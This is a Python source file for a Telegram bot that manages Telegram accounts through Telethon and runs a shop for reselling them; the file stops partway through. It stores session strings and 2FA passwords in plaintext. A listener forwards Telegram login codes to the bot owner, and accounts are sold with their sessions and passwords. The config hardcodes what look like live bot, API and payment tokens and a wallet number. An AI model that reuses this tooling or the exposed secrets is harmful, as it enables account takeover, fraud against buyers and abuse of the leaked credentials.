"""
TG Manager Pro — Telegram Bot
Управление Telegram-аккаунтами через бота (aiogram 3 + Telethon)
+ Магазин аккаунтов с оплатой CryptoBot / Звёзды / ЮMoney
"""

import asyncio
import json
import logging
import os
import sqlite3
import aiohttp
from datetime import datetime

from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message,
    LabeledPrice, PreCheckoutQuery
)
import re

from telethon import TelegramClient, events
from telethon.errors import (
    FloodWaitError, PhoneCodeExpiredError, SessionPasswordNeededError
)
from telethon.sessions import StringSession

# ─── Конфиг ──────────────────────────────────────────────────────────────────
BOT_TOKEN       = "8873506485:AAGn-H-PISk0n9LmpZe5Efy_J9OYoafGbgg"
API_ID          = 37658735
API_HASH        = "728f6de622061878b84d9f843181d879"
ADMIN_ID        = 8826396052
DB_PATH         = "accounts.db"
SESSIONS_DIR    = "sessions"

CRYPTOBOT_TOKEN = "632894:AAnLTRPHdAnsH96IKAGa9j1CX5EPcSFTrt7"   # токен от @CryptoBot
YOOMONEY_TOKEN  = ""                        # получишь позже
YOOMONEY_WALLET = "4100119593671464"                        # номер кошелька ЮMoney

COMMISSION_PCT  = 7  # % комиссии админу с каждой продажи

# Курс TON/RUB (обновляется динамически)
TON_RUB_RATE    = 700.0  # fallback если API недоступен

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

os.makedirs(SESSIONS_DIR, exist_ok=True)

# ─── База данных ──────────────────────────────────────────────────────────────
db = sqlite3.connect(DB_PATH, check_same_thread=False)
db.row_factory = sqlite3.Row
db.executescript("""
    CREATE TABLE IF NOT EXISTS accounts (
        id         INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id   INTEGER NOT NULL,
        phone      TEXT    NOT NULL,
        session    TEXT,
        username   TEXT,
        full_name  TEXT,
        password   TEXT,
        created_at TEXT    DEFAULT (datetime('now')),
        UNIQUE(owner_id, phone)
    );

    CREATE TABLE IF NOT EXISTS shop_items (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        seller_id   INTEGER NOT NULL,
        phone       TEXT    NOT NULL,
        title       TEXT    NOT NULL,
        description TEXT,
        origin      TEXT,
        password    TEXT,
        price_rub   INTEGER NOT NULL,
        stars_price INTEGER,
        status      TEXT    DEFAULT 'active',
        created_at  TEXT    DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS shop_orders (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        item_id     INTEGER NOT NULL,
        buyer_id    INTEGER NOT NULL,
        seller_id   INTEGER NOT NULL,
        pay_method  TEXT    NOT NULL,
        amount_rub  INTEGER NOT NULL,
        commission  INTEGER NOT NULL,
        status      TEXT    DEFAULT 'pending',
        pay_ref     TEXT,
        created_at  TEXT    DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS shop_purchases (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        buyer_id    INTEGER NOT NULL,
        item_id     INTEGER NOT NULL,
        order_id    INTEGER NOT NULL,
        phone       TEXT    NOT NULL,
        title       TEXT    NOT NULL,
        paid_rub    INTEGER NOT NULL,
        pay_method  TEXT    NOT NULL,
        purchased_at TEXT   DEFAULT (datetime('now'))
    );
""")

try:
    db.execute("ALTER TABLE accounts ADD COLUMN password TEXT")
    db.commit()
except Exception:
    pass
db.commit()

# ─── In-memory клиенты ───────────────────────────────────────────────────────
tg_clients: dict[int, dict[str, TelegramClient]] = {}
adm_code_tasks: dict[str, asyncio.Task] = {}

# ─── FSM States ──────────────────────────────────────────────────────────────
class AddPhone(StatesGroup):
    waiting_phone    = State()
    waiting_code     = State()
    waiting_password = State()

class LoadSession(StatesGroup):
    waiting_phone   = State()
    waiting_session = State()

class AddItem(StatesGroup):
    choose_account  = State()
    enter_title     = State()
    enter_desc      = State()
    enter_origin    = State()
    enter_password  = State()
    enter_price     = State()
    enter_stars     = State()
    confirm         = State()

# ─── DB helpers ──────────────────────────────────────────────────────────────
def db_save(owner_id, phone, client, username="", full_name="", password=""):
    session_str = client.session.save()
    db.execute(
        """INSERT INTO accounts (owner_id, phone, session, username, full_name, password)
           VALUES (?, ?, ?, ?, ?, ?)
           ON CONFLICT(owner_id, phone) DO UPDATE SET
               session=excluded.session,
               username=excluded.username,
               full_name=excluded.full_name,
               password=CASE WHEN excluded.password != '' THEN excluded.password ELSE password END""",
        (owner_id, phone, session_str, username, full_name, password)
    )
    db.commit()

def db_list(owner_id):
    return db.execute(
        "SELECT * FROM accounts WHERE owner_id=? ORDER BY created_at DESC", (owner_id,)
    ).fetchall()

def db_get(owner_id, phone):
    return db.execute(
        "SELECT * FROM accounts WHERE owner_id=? AND phone=?", (owner_id, phone)
    ).fetchone()

def db_delete(owner_id, phone):
    db.execute("DELETE FROM accounts WHERE owner_id=? AND phone=?", (owner_id, phone))
    db.commit()

# ─── Shop DB helpers ──────────────────────────────────────────────────────────
def shop_add_item(seller_id, phone, title, description, origin, password, price_rub, stars_price):
    cur = db.execute(
        """INSERT INTO shop_items (seller_id, phone, title, description, origin, password, price_rub, stars_price)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
        (seller_id, phone, title, description, origin, password, price_rub, stars_price)
    )
    db.commit()
    return cur.lastrowid

def shop_get_items(status="active"):
    return db.execute(
        "SELECT * FROM shop_items WHERE status=? ORDER BY created_at DESC", (status,)
    ).fetchall()

def shop_get_item(item_id):
    return db.execute("SELECT * FROM shop_items WHERE id=?", (item_id,)).fetchone()

def shop_mark_sold(item_id):
    db.execute("UPDATE shop_items SET status='sold' WHERE id=?", (item_id,))
    db.commit()

def shop_create_order(item_id, buyer_id, seller_id, pay_method, amount_rub):
    commission = int(amount_rub * COMMISSION_PCT / 100)
    cur = db.execute(
        """INSERT INTO shop_orders (item_id, buyer_id, seller_id, pay_method, amount_rub, commission)
           VALUES (?, ?, ?, ?, ?, ?)""",
        (item_id, buyer_id, seller_id, pay_method, amount_rub, commission)
    )
    db.commit()
    return cur.lastrowid

def shop_complete_order(order_id):
    db.execute("UPDATE shop_orders SET status='paid' WHERE id=?", (order_id,))
    db.commit()

def shop_add_purchase(buyer_id, item_id, order_id, phone, title, paid_rub, pay_method):
    db.execute(
        """INSERT INTO shop_purchases (buyer_id, item_id, order_id, phone, title, paid_rub, pay_method)
           VALUES (?, ?, ?, ?, ?, ?, ?)""",
        (buyer_id, item_id, order_id, phone, title, paid_rub, pay_method)
    )
    db.commit()

def shop_get_purchases(buyer_id):
    return db.execute(
        "SELECT * FROM shop_purchases WHERE buyer_id=? ORDER BY purchased_at DESC", (buyer_id,)
    ).fetchall()

def shop_get_user_items(seller_id):
    return db.execute(
        "SELECT * FROM shop_items WHERE seller_id=? ORDER BY created_at DESC", (seller_id,)
    ).fetchall()

# ─── Telethon helpers ─────────────────────────────────────────────────────────
def get_client(owner_id, phone):
    return tg_clients.get(owner_id, {}).get(phone)

def set_client(owner_id, phone, client):
    tg_clients.setdefault(owner_id, {})[phone] = client

def del_client(owner_id, phone):
    tg_clients.get(owner_id, {}).pop(phone, None)

CODE_RE = re.compile(r'\b(\d{5,6})\b')

def attach_code_listener(client, owner_id, phone):
    @client.on(events.NewMessage(from_users=[777000, 42777]))
    async def _handler(event):
        text  = event.raw_text or ""
        match = CODE_RE.search(text)
        code  = match.group(1) if match else None
        try:
            if code:
                await bot.send_message(
                    owner_id,
                    f"🔐 <b>Код авторизации</b>\n\nАккаунт: <code>{phone}</code>\nКод: <code>{code}</code>\n\n<i>Полное сообщение:</i>\n{text}",
                    parse_mode="HTML"
                )
            else:
                await bot.send_message(
                    owner_id,
                    f"📨 <b>Сообщение от Telegram</b>\nАккаунт: <code>{phone}</code>\n\n{text}",
                    parse_mode="HTML"
                )
        except Exception as e:
            log.error(f"[listener:{phone}] {e}")

async def make_client(session_str=""):
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    return client

async def get_profile(client):
    me = await client.get_me()
    if not me:
        return "", ""
    return me.username or "", f"{me.first_name or ''} {me.last_name or ''}".strip()

# ─── CryptoBot helpers ────────────────────────────────────────────────────────
async def get_ton_rate() -> float:
    """Получаем курс TON/RUB через CryptoBot API"""
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                "https://pay.crypt.bot/api/getExchangeRates",
                headers={"Crypto-Pay-API-Token": CRYPTOBOT_TOKEN},
                timeout=aiohttp.ClientTimeout(total=5)
            ) as r:
                data = await r.json()
                if data.get("ok"):
                    for item in data["result"]:
                        if item.get("source") == "TON" and item.get("target") == "RUB":
                            return float(item["rate"])
    except Exception as e:
        log.warning(f"CryptoBot rate error: {e}")
    return TON_RUB_RATE

async def cryptobot_create_invoice(amount_rub: int, order_id: int, description: str) -> dict:
    rate    = await get_ton_rate()
    ton_amt = round(amount_rub / rate, 4)
    payload = {
        "asset":       "TON",
        "amount":      str(ton_amt),
        "description": description,
        "payload":     str(order_id),
        "expires_in":  600
    }
    async with aiohttp.ClientSession() as s:
        async with s.post(
            "https://pay.crypt.bot/api/createInvoice",
            headers={"Crypto-Pay-API-Token": CRYPTOBOT_TOKEN},
            json=payload,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as r:
            data = await r.json()
            if data.get("ok"):
                inv = data["result"]
                return {"url": inv["pay_url"], "invoice_id": inv["invoice_id"], "ton": ton_amt}
            raise Exception(data.get("error", {}).get("name", "CryptoBot error"))

async def cryptobot_check_invoice(invoice_id: int) -> bool:
    async with aiohttp.ClientSession() as s:
        async with s.get(
            f"https://pay.crypt.bot/api/getInvoices?invoice_ids={invoice_id}",
            headers={"Crypto-Pay-API-Token": CRYPTOBOT_TOKEN},
            timeout=aiohttp.ClientTimeout(total=10)
        ) as r:
            data = await r.json()
            if data.get("ok"):
                items = data["result"].get("items", [])
                if items:
                    return items[0].get("status") == "paid"
    return False

# ─── Keyboards ────────────────────────────────────────────────────────────────
def kb_main():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Добавить по номеру",  callback_data="add_phone")],
        [InlineKeyboardButton(text="📂 Загрузить сессию",    callback_data="load_session")],
        [InlineKeyboardButton(text="📋 Мои аккаунты",        callback_data="list_accounts")],
        [InlineKeyboardButton(text="🛒 Магазин",             callback_data="shop_browse")],
        [InlineKeyboardButton(text="🧾 Мои покупки",         callback_data="my_purchases")],
        [InlineKeyboardButton(text="💼 Мои товары",          callback_data="my_items")],
    ])

def kb_account(phone):
    p = phone.replace("+", "")
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📊 Статистика",  callback_data=f"stats:{p}"),
            InlineKeyboardButton(text="📦 Экспорт",     callback_data=f"export:{p}"),
        ],
        [InlineKeyboardButton(text="🛒 Выставить в магазин", callback_data=f"sell:{p}")],
        [InlineKeyboardButton(text="🧹 Очистить диалоги", callback_data=f"clean:{p}")],
        [InlineKeyboardButton(text="🗑 Удалить аккаунт",  callback_data=f"delete:{p}")],
        [InlineKeyboardButton(text="◀️ Назад",             callback_data="list_accounts")],
    ])

def kb_back():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ В меню", callback_data="main_menu")]
    ])

def kb_confirm_clean(phone):
    p = phone.replace("+", "")
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Да, удалить всё", callback_data=f"clean_confirm:{p}"),
        InlineKeyboardButton(text="❌ Отмена",          callback_data=f"account:{p}"),
    ]])

def kb_confirm_delete(phone):
    p = phone.replace("+", "")
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Да, удалить", callback_data=f"delete_confirm:{p}"),
        InlineKeyboardButton(text="❌ Отмена",      callback_data=f"account:{p}"),
    ]])

def kb_accounts_list(accounts, owner_id):
    rows = []
    for acc in accounts:
        phone  = acc["phone"]
        p      = phone.replace("+", "")
        name   = acc["full_name"] or phone
        online = "🟢" if get_client(owner_id, phone) else "⚫️"
        rows.append([InlineKeyboardButton(
            text=f"{online} {name} ({phone})",
            callback_data=f"account:{p}"
        )])
    rows.append([InlineKeyboardButton(text="◀️ В меню", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_cancel():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu")]
    ])

def kb_shop_item(item_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💎 CryptoBot (TON)", callback_data=f"buy_crypto:{item_id}"),
        ],
        [
            InlineKeyboardButton(text="⭐ Звёзды",           callback_data=f"buy_stars:{item_id}"),
            InlineKeyboardButton(text="💳 ЮMoney",           callback_data=f"buy_ymoney:{item_id}"),
        ],
        [InlineKeyboardButton(text="◀️ Назад",               callback_data="shop_browse")],
    ])

def kb_shop_browse(items):
    rows = []
    for it in items:
        rows.append([InlineKeyboardButton(
            text=f"📱 {it['title']} — {it['price_rub']}₽",
            callback_data=f"shop_item:{it['id']}"
        )])
    rows.append([InlineKeyboardButton(text="➕ Продать аккаунт", callback_data="shop_sell")])
    rows.append([InlineKeyboardButton(text="◀️ В меню",          callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ─── Bot + Dispatcher ─────────────────────────────────────────────────────────
bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())

# ─── /start ───────────────────────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    await msg.answer(
        "👋 <b>TG Manager Pro</b>\n\nУправляй своими Telegram-аккаунтами.\nВыбери действие:",
        reply_markup=kb_main(), parse_mode="HTML"
    )

@dp.message(Command("menu"))
async def cmd_menu(msg: Message, state: FSMContext):
    await state.clear()
    await msg.answer("📌 Главное меню:", reply_markup=kb_main())

@dp.callback_query(F.data == "main_menu")
async def cb_main_menu(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    await cb.message.edit_text(
        "📌 <b>Главное меню</b>\nВыбери действие:",
        reply_markup=kb_main(), parse_mode="HTML"
    )

# ─── Список аккаунтов ─────────────────────────────────────────────────────────
@dp.callback_query(F.data == "list_accounts")
async def cb_list(cb: CallbackQuery):
    owner_id = cb.from_user.id
    accounts = db_list(owner_id)
    if not accounts:
        await cb.message.edit_text(
            "📭 <b>Аккаунтов нет</b>\n\nДобавь первый через меню.",
            reply_markup=kb_back(), parse_mode="HTML"
        )
        return
    await cb.message.edit_text(
        f"📋 <b>Твои аккаунты</b> ({len(accounts)} шт.)\n\nВыбери для управления:",
        reply_markup=kb_accounts_list(accounts, owner_id), parse_mode="HTML"
    )

# ─── Карточка аккаунта ────────────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("account:"))
async def cb_account(cb: CallbackQuery):
    owner_id = cb.from_user.id
    p        = cb.data.split(":", 1)[1]
    phone    = "+" + p
    row      = db_get(owner_id, phone)
    if not row:
        await cb.answer("Аккаунт не найден", show_alert=True)
        return
    online = "🟢 Online" if get_client(owner_id, phone) else "⚫️ Offline"
    name   = row["full_name"] or "—"
    uname  = f"@{row['username']}" if row["username"] else "—"
    added  = row["created_at"][:10]
    await cb.message.edit_text(
        f"<b>{name}</b> {uname}\n📱 <code>{phone}</code>\nСтатус: {online}\nДобавлен: {added}",
        reply_markup=kb_account(phone), parse_mode="HTML"
    )

# ─── Статистика ───────────────────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("stats:"))
async def cb_stats(cb: CallbackQuery):
    owner_id = cb.from_user.id
    phone    = "+" + cb.data.split(":", 1)[1]
    client   = get_client(owner_id, phone)
    if not client:
        row = db_get(owner_id, phone)
        if not row or not row["session"]:
            await cb.answer("Нет активной сессии", show_alert=True)
            return
        client = await make_client(row["session"])
        set_client(owner_id, phone, client)
    await cb.answer("⏳ Считаю диалоги...")
    try:
        dialogs = await client.get_dialogs()
        await cb.message.edit_text(
            f"📊 <b>Статистика</b> <code>{phone}</code>\n\n💬 Диалогов: <b>{len(dialogs)}</b>",
            reply_markup=kb_account(phone), parse_mode="HTML"
        )
    except Exception as e:
        await cb.message.edit_text(f"❌ Ошибка: {e}", reply_markup=kb_account(phone))

# ─── Экспорт сессии ───────────────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("export:"))
async def cb_export(cb: CallbackQuery):
    from aiogram.types import FSInputFile
    owner_id = cb.from_user.id
    phone    = "+" + cb.data.split(":", 1)[1]
    row      = db_get(owner_id, phone)
    if not row or not row["session"]:
        await cb.answer("Нет сохранённой сессии", show_alert=True)
        return
    data      = {"phone": phone, "session": row["session"], "username": row["username"],
                 "full_name": row["full_name"], "exported_at": datetime.utcnow().isoformat()}
    path      = os.path.join(SESSIONS_DIR, phone.lstrip("+"))
    os.makedirs(path, exist_ok=True)
    file_path = os.path.join(path, "session.json")
    with open(file_path, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    await cb.answer("✅ Сессия экспортирована")
    doc = FSInputFile(file_path, filename=f"{phone.lstrip('+')}_session.json")
    await cb.message.answer_document(doc, caption=f"📦 Сессия для <code>{phone}</code>", parse_mode="HTML")

# ─── Очистка диалогов ────────────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("clean:"))
async def cb_clean_confirm(cb: CallbackQuery):
    phone = "+" + cb.data.split(":", 1)[1]
    await cb.message.edit_text(
        f"⚠️ <b>Подтверди очистку</b>\n\nВсе диалоги <code>{phone}</code> будут удалены.\n<b>Необратимо!</b>",
        reply_markup=kb_confirm_clean(phone), parse_mode="HTML"
    )

@dp.callback_query(F.data.startswith("clean_confirm:"))
async def cb_clean_do(cb: CallbackQuery):
    owner_id = cb.from_user.id
    phone    = "+" + cb.data.split(":", 1)[1]
    client   = get_client(owner_id, phone)
    if not client:
        row = db_get(owner_id, phone)
        if not row or not row["session"]:
            await cb.answer("Нет активной сессии", show_alert=True)
            return
        client = await make_client(row["session"])
        set_client(owner_id, phone, client)
    await cb.message.edit_text(f"⏳ Очищаю диалоги <code>{phone}</code>...", parse_mode="HTML")
    deleted = errors = 0
    try:
        async for dialog in client.iter_dialogs():
            try:
                await client.delete_dialog(dialog.id, revoke=True)
                deleted += 1
            except Exception:
                errors += 1
    except Exception as e:
        await cb.message.edit_text(f"❌ Ошибка: {e}", reply_markup=kb_account(phone))
        return
    await cb.message.edit_text(
        f"✅ <b>Очистка завершена</b>\n\nАккаунт: <code>{phone}</code>\n🗑 Удалено: <b>{deleted}</b>\n⚠️ Ошибок: <b>{errors}</b>",
        reply_markup=kb_account(phone), parse_mode="HTML"
    )

# ─── Удаление аккаунта ────────────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("delete:"))
async def cb_delete_confirm(cb: CallbackQuery):
    phone = "+" + cb.data.split(":", 1)[1]
    await cb.message.edit_text(
        f"🗑 <b>Удалить аккаунт?</b>\n\n<code>{phone}</code> будет удалён из базы.",
        reply_markup=kb_confirm_delete(phone), parse_mode="HTML"
    )

@dp.callback_query(F.data.startswith("delete_confirm:"))
async def cb_delete_do(cb: CallbackQuery):
    owner_id = cb.from_user.id
    phone    = "+" + cb.data.split(":", 1)[1]
    client   = get_client(owner_id, phone)
    if client:
        try:
            await client.log_out()
        except Exception:
            pass
        del_client(owner_id, phone)
    db_delete(owner_id, phone)
    await cb.message.edit_text(
        f"✅ Аккаунт <code>{phone}</code> удалён.",
        reply_markup=kb_back(), parse_mode="HTML"
    )

# ─── Добавить по номеру ───────────────────────────────────────────────────────
@dp.callback_query(F.data == "add_phone")
async def cb_add_phone(cb: CallbackQuery, state: FSMContext):
    await state.set_state(AddPhone.waiting_phone)
    await cb.message.edit_text(
        "📱 <b>Добавить аккаунт</b>\n\nВведи номер телефона:\n<code>+79001234567</code>",
        reply_markup=kb_cancel(), parse_mode="HTML"
    )

@dp.message(AddPhone.waiting_phone)
async def fsm_phone(msg: Message, state: FSMContext):
    phone = msg.text.strip()
    if not phone.startswith("+") or not phone[1:].isdigit():
        await msg.answer("❌ Некорректный номер. Пример: <code>+79001234567</code>", parse_mode="HTML")
        return
    wait = await msg.answer("⏳ Отправляю код...")
    try:
        client = await make_client()
        await client.send_code_request(phone)
        set_client(msg.from_user.id, phone, client)
        await state.update_data(phone=phone)
        await state.set_state(AddPhone.waiting_code)
        await wait.edit_text(
            f"📨 Код отправлен на <code>{phone}</code>\n\nВведи код из Telegram:",
            reply_markup=kb_cancel(), parse_mode="HTML"
        )
    except FloodWaitError as e:
        await wait.edit_text(f"⏳ Flood wait — подожди {e.seconds} сек.", reply_markup=kb_back())
        await state.clear()
    except Exception as e:
        await wait.edit_text(f"❌ Ошибка: {e}", reply_markup=kb_back())
        await state.clear()

@dp.message(AddPhone.waiting_code)
async def fsm_code(msg: Message, state: FSMContext):
    code   = msg.text.strip()
    data   = await state.get_data()
    phone  = data["phone"]
    client = get_client(msg.from_user.id, phone)
    if not client:
        await msg.answer("❌ Сессия истекла, начни заново.", reply_markup=kb_back())
        await state.clear()
        return
    wait = await msg.answer("⏳ Проверяю код...")
    try:
        await client.sign_in(phone, code)
        username, full_name = await get_profile(client)
        db_save(msg.from_user.id, phone, client, username, full_name)
        set_client(msg.from_user.id, phone, client)
        attach_code_listener(client, msg.from_user.id, phone)
        await state.clear()
        await wait.edit_text(
            f"✅ <b>Аккаунт добавлен!</b>\n\n👤 {full_name or '—'} {'@'+username if username else ''}\n📱 <code>{phone}</code>\n\n👂 Слушаю входящие коды...",
            reply_markup=kb_main(), parse_mode="HTML"
        )
    except PhoneCodeExpiredError:
        await wait.edit_text("❌ Код истёк. Начни заново.", reply_markup=kb_back())
        await state.clear()
    except SessionPasswordNeededError:
        await state.set_state(AddPhone.waiting_password)
        await wait.edit_text("🔐 Требуется пароль 2FA.\n\nВведи пароль:", reply_markup=kb_cancel(), parse_mode="HTML")
    except Exception as e:
        await wait.edit_text(f"❌ Ошибка: {e}", reply_markup=kb_back())
        await state.clear()

@dp.message(AddPhone.waiting_password)
async def fsm_password(msg: Message, state: FSMContext):
    password = msg.text.strip()
    data     = await state.get_data()
    phone    = data["phone"]
    client   = get_client(msg.from_user.id, phone)
    try:
        await msg.delete()
    except Exception:
        pass
    if not client:
        await msg.answer("❌ Сессия истекла, начни заново.", reply_markup=kb_back())
        await state.clear()
        return
    wait = await msg.answer("⏳ Проверяю пароль...")
    try:
        await client.sign_in(password=password)
        username, full_name = await get_profile(client)
        db_save(msg.from_user.id, phone, client, username, full_name, password)
        set_client(msg.from_user.id, phone, client)
        attach_code_listener(client, msg.from_user.id, phone)
        await state.clear()
        await wait.edit_text(
            f"✅ <b>Аккаунт добавлен!</b>\n\n👤 {full_name or '—'} {'@'+username if username else ''}\n📱 <code>{phone}</code>\n\n👂 Слушаю входящие коды...",
            reply_markup=kb_main(), parse_mode="HTML"
        )
    except Exception as e:
        await wait.edit_text(f"❌ Неверный пароль: {e}", reply_markup=kb_back())
        await state.clear()

# ─── Загрузить сессию ─────────────────────────────────────────────────────────
@dp.callback_query(F.data == "load_session")
async def cb_load_session(cb: CallbackQuery, state: FSMContext):
    await state.set_state(LoadSession.waiting_phone)
    await cb.message.edit_text(
        "📂 <b>Загрузка сессии</b>\n\nВведи номер телефона аккаунта:",
        reply_markup=kb_cancel(), parse_mode="HTML"
    )

@dp.message(LoadSession.waiting_phone)
async def fsm_sess_phone(msg: Message, state: FSMContext):
    phone = msg.text.strip()
    if not phone.startswith("+"):
        await msg.answer("❌ Формат: <code>+79001234567</code>", parse_mode="HTML")
        return
    await state.update_data(phone=phone)
    await state.set_state(LoadSession.waiting_session)
    await msg.answer(
        "📋 Теперь отправь <b>session string</b>:\n\n<i>Это строка вида 1BVtsOK...</i>",
        parse_mode="HTML", reply_markup=kb_cancel()
    )

@dp.message(LoadSession.waiting_session)
async def fsm_sess_string(msg: Message, state: FSMContext):
    sess_str = msg.text.strip()
    data     = await state.get_data()
    phone    = data["phone"]
    wait     = await msg.answer("⏳ Проверяю сессию...")
    try:
        client = await make_client(sess_str)
        if not await client.is_user_authorized():
            raise Exception("Сессия невалидна или истекла")
        username, full_name = await get_profile(client)
        db_save(msg.from_user.id, phone, client, username, full_name)
        set_client(msg.from_user.id, phone, client)
        attach_code_listener(client, msg.from_user.id, phone)
        await state.clear()
        await wait.edit_text(
            f"✅ <b>Сессия загружена!</b>\n\n👤 {full_name or '—'} {'@'+username if username else ''}\n📱 <code>{phone}</code>\n\n👂 Слушаю входящие коды...",
            reply_markup=kb_main(), parse_mode="HTML"
        )
    except Exception as e:
        await wait.edit_text(f"❌ Ошибка: {e}", reply_markup=kb_back())
        await state.clear()

# ═══════════════════════════════════════════════════════════════════════════════
# ─── МАГАЗИН ──────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

@dp.callback_query(F.data == "shop_browse")
async def cb_shop_browse(cb: CallbackQuery):
    items = shop_get_items()
    if not items:
        await cb.message.edit_text(
            "🛒 <b>Магазин пуст</b>\n\nПока нет товаров. Выстави первый!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="➕ Продать аккаунт", callback_data="shop_sell")],
                [InlineKeyboardButton(text="◀️ В меню", callback_data="main_menu")],
            ]),
            parse_mode="HTML"
        )
        return
    await cb.message.edit_text(
        f"🛒 <b>Магазин</b> — {len(items)} товаров\n\nВыбери аккаунт:",
        reply_markup=kb_shop_browse(items), parse_mode="HTML"
    )

@dp.callback_query(F.data.startswith("shop_item:"))
async def cb_shop_item(cb: CallbackQuery):
    item_id = int(cb.data.split(":", 1)[1])
    item    = shop_get_item(item_id)
    if not item or item["status"] != "active":
        await cb.answer("❌ Товар уже продан или не найден", show_alert=True)
        return
    stars_line = f"⭐ Звёзды: <b>{item['stars_price']}</b>\n" if item["stars_price"] else ""
    await cb.message.edit_text(
        f"📱 <b>{item['title']}</b>\n\n"
        f"📝 {item['description'] or '—'}\n"
        f"🌍 Происхождение: {item['origin'] or '—'}\n"
        f"🔑 Пароль 2FA: {'✅ есть' if item['password'] else '❌ нет'}\n\n"
        f"💰 Цена: <b>{item['price_rub']}₽</b>\n"
        f"{stars_line}"
        f"\nВыбери способ оплаты:",
        reply_markup=kb_shop_item(item_id), parse_mode="HTML"
    )

# ─── Добавить товар в магазин ─────────────────────────────────────────────────
@dp.callback_query(F.data == "shop_sell")
async def cb_shop_sell(cb: CallbackQuery, state: FSMContext):
    owner_id = cb.from_user.id
    accounts = db_list(owner_id)
    if not accounts:
        await cb.answer("У тебя нет аккаунтов для продажи", show_alert=True)
        return
    rows = []
    for acc in accounts:
        p = acc["phone"].replace("+", "")
        rows.append([InlineKeyboardButton(
            text=f"📱 {acc['full_name'] or acc['phone']} ({acc['phone']})",
            callback_data=f"sell:{p}"
        )])
    rows.append([InlineKeyboardButton(text="❌ Отмена", callback_data="shop_browse")])
    await state.set_state(AddItem.choose_account)
    await cb.message.edit_text(
        "🛒 <b>Выставить аккаунт на продажу</b>\n\nВыбери аккаунт:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML"
    )

@dp.callback_query(F.data.startswith("sell:"))
async def cb_sell_account(cb: CallbackQuery, state: FSMContext):
    p     = cb.data.split(":", 1)[1]
    phone = "+" + p
    await state.update_data(phone=phone)
    await state.set_state(AddItem.enter_title)
    await cb.message.edit_text(
        f"📱 Аккаунт: <code>{phone}</code>\n\n✏️ <b>Введи название товара</b>\n\nПример: <i>TG аккаунт 2019 года, 500 друзей</i>",
        reply_markup=kb_cancel(), parse_mode="HTML"
    )

@dp.message(AddItem.enter_title)
async def fsm_item_title(msg: Message, state: FSMContext):
    await state.update_data(title=msg.text.strip())
    await state.set_state(AddItem.enter_desc)
    await msg.answer(
        "📝 <b>Описание</b>\n\nРасскажи подробнее об аккаунте (или отправь <code>-</code> чтобы пропустить):",
        reply_markup=kb_cancel(), parse_mode="HTML"
    )

@dp.message(AddItem.enter_desc)
async def fsm_item_desc(msg: Message, state: FSMContext):
    desc = msg.text.strip()
    await state.update_data(description="" if desc == "-" else desc)
    await state.set_state(AddItem.enter_origin)
    await msg.answer(
        "🌍 <b>Происхождение аккаунта</b>\n\nПример: <i>Россия, куплен 2021, не банился</i>\nИли отправь <code>-</code>:",
        reply_markup=kb_cancel(), parse_mode="HTML"
    )

@dp.message(AddItem.enter_origin)
async def fsm_item_origin(msg: Message, state: FSMContext):
    origin = msg.text.strip()
    await state.update_data(origin="" if origin == "-" else origin)
    await state.set_state(AddItem.enter_password)
    await msg.answer(
        "🔑 <b>Пароль 2FA</b>\n\nЕсли есть — введи. Если нет — отправь <code>-</code>:",
        reply_markup=kb_cancel(), parse_mode="HTML"
    )

@dp.message(AddItem.enter_password)
async def fsm_item_password(msg: Message, state: FSMContext):
    pwd = msg.text.strip()
    try:
        await msg.delete()
    except Exception:
        pass
    await state.update_data(item_password="" if pwd == "-" else pwd)
    await state.set_state(AddItem.enter_price)
    await msg.answer(
        "💰 <b>Цена в рублях</b>\n\nВведи число, например: <code>500</code>",
        reply_markup=kb_cancel(), parse_mode="HTML"
    )

@dp.message(AddItem.enter_price)
async def fsm_item_price(msg: Message, state: FSMContext):
    txt = msg.text.strip()
    if not txt.isdigit() or int(txt) < 1:
        await msg.answer("❌ Введи целое число больше 0:")
        return
    await state.update_data(price_rub=int(txt))
    await state.set_state(AddItem.enter_stars)
    await msg.answer(
        "⭐ <b>Цена в звёздах</b>\n\nВведи количество звёзд или отправь <code>-</code> чтобы не принимать звёзды:",
        reply_markup=kb_cancel(), parse_mode="HTML"
    )

